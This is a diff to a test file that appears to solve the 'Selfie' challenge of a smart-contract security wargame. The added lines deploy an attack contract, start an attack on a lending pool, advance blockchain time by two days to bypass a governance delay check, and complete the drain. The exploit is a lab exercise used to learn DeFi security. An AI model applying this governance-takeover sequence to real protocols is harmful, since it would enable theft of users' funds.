@@ -39,6 +39,17 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // deploy attack contract
+        attacker = await (await ethers.getContractFactory('SelfiePoolAttack', deployer)).deploy();
+
+        // initiate the attack
+        await attacker.connect(player).attack(pool.address, TOKENS_IN_POOL);
+
+        // Advance time by 2 days to bypass check in SimpleGovernance._canBeExecuted()
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+
+        // complete the attack
+        await attacker.completeAttack();
     });
 
     after(async function () {
